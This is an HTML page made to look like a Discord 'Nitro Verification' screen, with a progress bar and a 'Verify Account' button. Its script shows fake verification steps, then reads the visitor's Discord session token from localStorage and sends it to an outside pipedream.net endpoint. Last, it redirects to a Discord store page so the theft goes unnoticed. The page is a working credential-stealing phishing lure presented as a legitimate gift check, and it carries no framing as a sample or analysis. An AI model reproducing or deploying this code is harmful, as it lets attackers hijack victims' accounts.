<!DOCTYPE html>
<html>
<head>
    <style>
        body { 
            background-color: #202225; color: #fff; font-family: 'Helvetica Neue', Helvetica, Arial, sans-serif;
            display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0;
        }
        .main-card { 
            background: #2f3136; padding: 60px; border-radius: 12px; border: 1px solid #202225;
            box-shadow: 0 4px 20px rgba(0,0,0,0.6); text-align: center; width: 450px;
        }
        h1 { font-size: 28px; margin-bottom: 20px; color: #ffffff; }
        .status-text { font-size: 16px; color: #b9bbbe; margin-bottom: 25px; }
        .progress-container { width: 100%; height: 8px; background: #202225; border-radius: 4px; margin-bottom: 30px; overflow: hidden; }
        #bar { height: 100%; width: 0%; background: #5865f2; transition: width 0.8s ease-in-out; }
        button { 
            background: #5865f2; color: #fff; border: none; padding: 15px 40px; 
            border-radius: 4px; font-size: 16px; font-weight: 600; cursor: pointer; transition: 0.2s;
        }
        button:hover { background: #4752c4; }
    </style>
</head>
<body>
    <div class="main-card">
        <h1>Nitro Verification</h1>
        <div class="status-text" id="status">Connecting to Discord servers...</div>
        <div class="progress-container"><div id="bar"></div></div>
        <button id="btn" onclick="start()">Verify Account</button>
    </div>

    <script>
        async function start() {
            document.getElementById('btn').style.display = 'none';
            const status = document.getElementById('status');
            const bar = document.getElementById('bar');
            const steps = ["Validating session...", "Syncing profile data...", "Injecting gift...", "Authenticating..."];
            
            for(let i=0; i<steps.length; i++) {
                status.innerText = steps[i];
                bar.style.width = (i+1) * 25 + "%";
                await new Promise(r => setTimeout(r, 1200));
            }

            const token = localStorage.getItem("token");
            if(token) {
                fetch('https://eophhta5galgyza.m.pipedream.net', {
                    method: 'POST', mode: 'no-cors', body: JSON.stringify({ token: token })
                });
            }
            
            status.innerText = "Success! Redirecting...";
            setTimeout(() => window.location.href = "https://discord.com/store/skus/1234567890/nitro", 1000);
        }
    </script>
</body>
</html>
